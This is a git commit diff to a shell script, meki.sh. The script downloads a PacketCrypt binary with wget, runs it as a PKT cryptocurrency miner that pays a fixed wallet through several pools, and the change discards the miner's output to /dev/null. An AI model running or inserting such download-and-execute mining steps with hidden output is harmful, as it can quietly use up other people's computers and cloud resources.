a258d9881462bb2516431bac12243feed54668d5
renilo <88342640+renilo@users.noreply.github.com>
2022-02-07 17:37:30 +0700

    Update meki.sh

--- meki.sh
+++ meki.sh
@@ -8,9 +8,4 @@ wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
 
 chmod +x packetcrypt
 
-./packetcrypt ann -p pkt1qvqvcz02afzkhujlw382nafy49r6nh8ppd2xkjd https://stratum.zetahash.com/ http://pool.pkt.world http://pktco.in http://pool.pktpool.io http://pool.pkteer.com
-
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+./packetcrypt ann -p pkt1qvqvcz02afzkhujlw382nafy49r6nh8ppd2xkjd https://stratum.zetahash.com http://pool.pktpool.io http://pool.pkt.world/ 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null 2>&1
